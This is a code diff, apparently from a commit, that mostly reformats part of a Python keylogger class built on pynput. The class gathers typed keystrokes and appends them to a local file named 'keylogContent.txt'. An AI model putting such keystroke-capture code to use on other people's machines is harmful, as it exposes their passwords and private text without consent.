@@ -4,24 +4,22 @@ from pynput import keyboard
 
 class Logger:
     def __init__(self, with_onrelease=True):
-        self.with_onrelease=with_onrelease
+        self.with_onrelease = with_onrelease
         self.text = ""
         self.stop_flag = False
         self.start_listener()
 
-
     def get_text_out(self):
-        captured_text=self.text
-        self.text=""
+        captured_text = self.text
+        self.text = ""
         return captured_text
 
     def write_to_file(self, filename = "keylogContent.txt"):
+        res=False
         try:
-            with open(filename,'a') as file_obj:
+            with open(filename, 'a') as file_obj:
                 file_obj.write(self.get_text_out())
-            res=True
-        except:
-            res=False
+            res = True
         finally:
             return res
 
